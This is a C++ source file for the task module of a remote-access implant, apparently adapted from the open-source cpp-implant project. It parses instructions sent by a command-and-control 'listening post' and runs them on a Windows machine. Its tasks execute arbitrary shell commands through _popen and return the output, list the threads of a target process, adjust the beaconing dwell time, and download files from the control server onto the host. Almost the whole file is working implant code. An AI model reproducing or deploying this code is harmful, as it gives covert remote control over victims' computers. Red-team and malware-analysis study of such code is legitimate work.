/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * The original author of this code is Josh Lospinoso (@jalospinoso).
 * The unmodified source code can be found here: https://github.com/JLospinoso/cpp-implant
*/
#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif

#include "tasks.h"

#include <string>
#include <array>
#include <iostream>
#include <sstream>
#include <fstream>
#include <cstdlib>

#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/ptree.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/filesystem.hpp>
#include <nlohmann/json.hpp>

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <cpr/cpr.h>

using namespace boost::filesystem;
using json = nlohmann::json;

// Function to parse the tasks from the property tree returned by the listening post
// Execute each task according to the key specified (e.g. Got task_type of "ping"? Run the PingTask)
[[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
    std::function<void(const Configuration&)> setter) {
    // Get the task type and identifier, declare our variables
    const auto taskType = taskTree.get_child("task_type").get_value<std::string>();
    const auto idString = taskTree.get_child("task_id").get_value<std::string>();
    const auto agent_id = taskTree.get_child("agent_id").get_value<std::string>();
    std::stringstream idStringStream{ idString };
    boost::uuids::uuid id{};
    idStringStream >> id;

    // Conditionals to determine which task should be executed based on key provided
    // REMEMBER: Any new tasks must be added to the conditional check, along with arg values
    // ===========================================================================================
    if (taskType == PingTask::key) {
        return PingTask{
            id,
            agent_id
        };
    }
    if (taskType == ConfigureTask::key) {
        return ConfigureTask{
            id,
            taskTree.get_child("dwell").get_value<double>(),
            taskTree.get_child("running").get_value<bool>(),
            agent_id,
            std::move(setter)
        };
    }
    if (taskType == ExecuteTask::key) {
        return ExecuteTask{
            id,
            agent_id,
            taskTree.get_child("command").get_value<std::string>()
        };
    }
    if (taskType == ListThreadsTask::key) {
        return ListThreadsTask{
            id,
            agent_id,
            taskTree.get_child("procid").get_value<std::string>()
        };
    }
    if (taskType == DownloadFileTask::key) {
        return DownloadFileTask{
            id,
            agent_id,
            taskTree.get_child("filename").get_value<std::string>(),
            taskTree.get_child("save_as").get_value<std::string>()
        };
    }

    // ===========================================================================================

    // No conditionals matched, so an undefined task type must have been provided and we error out
    std::string errorMsg{ "Illegal task type encountered: " };
    errorMsg.append(taskType);
    throw std::logic_error{ errorMsg };
}

// Instantiate the implant configuration
Configuration::Configuration(const double meanDwell, const bool isRunning, const std::string agent_id)
    : meanDwell(meanDwell), isRunning(isRunning), agent_id(agent_id) {}


// Tasks
// ===========================================================================================

// PingTask
// -------------------------------------------------------------------------------------------
PingTask::PingTask(const boost::uuids::uuid& id, const std::string agent_id)
    : id{ id } {}

Result PingTask::run(std::string host, std::string port) const {
    const auto pingResult = "PONG!";
    return Result{ id, agent_id, pingResult, true };
}


// ConfigureTask
// -------------------------------------------------------------------------------------------
ConfigureTask::ConfigureTask(const boost::uuids::uuid& id,
    double meanDwell,
    bool isRunning,
    std::string agent_id,
    std::function<void(const Configuration&)> setter)
    : id{ id },
    meanDwell{ meanDwell },
    isRunning{ isRunning },
    agent_id{ agent_id },
    setter{ std::move(setter) } {}

Result ConfigureTask::run(std::string host, std::string port) const {
    // Call setter to set the implant configuration, mean dwell time and running status
    setter(Configuration{ meanDwell, isRunning, agent_id });
    return Result{ id, agent_id, "Configuration successful!", true };
}


// ExecuteTask
// -------------------------------------------------------------------------------------------
ExecuteTask::ExecuteTask(const boost::uuids::uuid& id, std::string agent_id, std::string command)
    : id{ id },
    command{ std::move(command) } {}

Result ExecuteTask::run(std::string host, std::string port) const {
    std::string result;
    try {
        std::array<char, 128> buffer{};
        std::unique_ptr<FILE, decltype(&_pclose)> pipe{
            _popen(command.c_str(), "r"),
            _pclose
        };
        if (!pipe)
            throw std::runtime_error("Failed to open pipe.");
        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
            result += buffer.data();
        }
        return Result{ id, agent_id, std::move(result), true };
    }
    catch (const std::exception& e) {
        return Result{ id, agent_id, e.what(), false };
    }
}


// ListThreadsTask
// -------------------------------------------------------------------------------------------
ListThreadsTask::ListThreadsTask(const boost::uuids::uuid& id, std::string agent_id, std::string processId)
    : id{ id },
    processId{ processId } {}

Result ListThreadsTask::run(std::string host, std::string port) const {
    try {
        std::stringstream threadList;
        auto ownerProcessId{ 0 };

        // User wants to list threads in current process
        if (processId == "-") {
            ownerProcessId = GetCurrentProcessId();
        }
        // If the process ID is not blank, try to use it for listing the threads in the process
        else if (processId != "") {
            ownerProcessId = stoi(processId);
        }
        // Some invalid process ID was provided, throw an error
        else {
            return Result{ id, agent_id, "Error! Failed to handle given process ID.", false };
        }

        HANDLE threadSnap = INVALID_HANDLE_VALUE;
        THREADENTRY32 te32;

        // Take a snapshot of all running threads
        threadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (threadSnap == INVALID_HANDLE_VALUE)
            return Result{ id, agent_id, "Error! Could not take a snapshot of all running threads.", false };

        // Fill in the size of the structure before using it. 
        te32.dwSize = sizeof(THREADENTRY32);

        // Retrieve information about the first thread,
        // and exit if unsuccessful
        if (!Thread32First(threadSnap, &te32))
        {
            CloseHandle(threadSnap);     // Must clean up the snapshot object!
            return Result{ id, agent_id, "Error! Could not retrieve information about first thread.", false };
        }

        // Now walk the thread list of the system,
        // and display information about each thread
        // associated with the specified process
        do
        {
            if (te32.th32OwnerProcessID == ownerProcessId)
            {
                // Add all thread IDs to a string stream
                threadList << "THREAD ID      = " << te32.th32ThreadID << "\n";
            }
        } while (Thread32Next(threadSnap, &te32));

        //  Don't forget to clean up the snapshot object.
        CloseHandle(threadSnap);
        // Return string stream of thread IDs
        return Result{ id, agent_id, threadList.str(), true };
    }
    catch (const std::exception& e) {
        return Result{ id, agent_id, e.what(), false };
    }
}


// DownloadFileTask
// -------------------------------------------------------------------------------------------
DownloadFileTask::DownloadFileTask(const boost::uuids::uuid& id, std::string agent_id, std::string filename, std::string save_as)
    : id{ id },
    filename{ filename }, 
    save_as{ save_as } {}


Result DownloadFileTask::run(std::string host, std::string port) const {
    std::string file = "";
    try {
        // Split full paths of files into their directories and filenames
        path remotepath = filename;
        std::string remotefilename = remotepath.filename().string();
        std::string remoteparentpath = remotepath.parent_path().string();
        path localpath = save_as;
        std::string localfilename = localpath.filename().string();
        path localparentpath = localpath.parent_path();

        // Construct payload
        boost::property_tree::ptree ptree;
        ptree.add("path",remoteparentpath);
        ptree.add("filename", remotefilename);
        std::stringstream payload;
        boost::property_tree::write_json(payload, ptree);

        // Retrieve file from server
        auto const serverAddress = host;
        auto const serverPort = port;
        auto const serverUri = "/files";
        auto const httpVersion = 11;
        auto const requestBody = json::parse(payload);

        // Construct our listening post endpoint URL from user args
        std::stringstream ss;
        ss << "http://" << serverAddress << ":" << serverPort << serverUri;
        std::string fullServerUrl = ss.str();

        // Make an asynchronous HTTP GET request to the listening post
        cpr::AsyncResponse asyncRequest = cpr::GetAsync(cpr::Url{ fullServerUrl },
            cpr::Body{ requestBody.dump() },
            cpr::Header{ {"Content-Type", "application/json"} }
        );
        // Retrieve the file when it's ready
        cpr::Response response = asyncRequest.get();

        // Save the file returned by the listening post
        std::string resp = response.text;
        if (exists(localparentpath)) {
            ofstream out(localpath, std::ios::out);
            out << resp;
            return Result{ id, agent_id, "File saved as: " + localpath.string(), true };
        }
        else { // Edit this to create the directory at some point. (From code below)
            return Result{ id, agent_id, "Directory does not exist", false };
        }
    }
    catch (const std::exception& e) {
        return Result{ id, agent_id, e.what(), false };
    }
}

// ===========================================================================================
/*
// create a file, plus any required directories
std::ofstream CreateFileAndRequiredDirectories(const std::string& filePath) {	// just to simplify things...	
    namespace filesystem = boost::filesystem;
    using boost::filesystem::path;
    // create a boost path object representing the file path;	
    path filePathObject(filePath, filesystem::native);
    if (!filesystem::exists(filePathObject.parent_path())) {		// if the file's parent directory doesn't exist,		
                                                                    // then we need to do a little more work...		
        // create a path object to represent the file's parent directory		
        path dirPath(filePathObject.parent_path(), filesystem::native);		// ...walk through each directory in the parent directory path		
                                                                            // from root to absolute path and create any parent directories		
                                                                            // that don't exist yet		
        path partialPath("", filesystem::native);
        path::iterator currPath = dirPath.begin();
        path::iterator endPath = dirPath.end();
        while (currPath != endPath) {
            partialPath /= path(*currPath, filesystem::native);
            if (!filesystem::exists(partialPath)) {
                filesystem::create_directory(partialPath);
            }
            ++currPath;
        }
    }
    return std::ofstream(filePath);
}
*/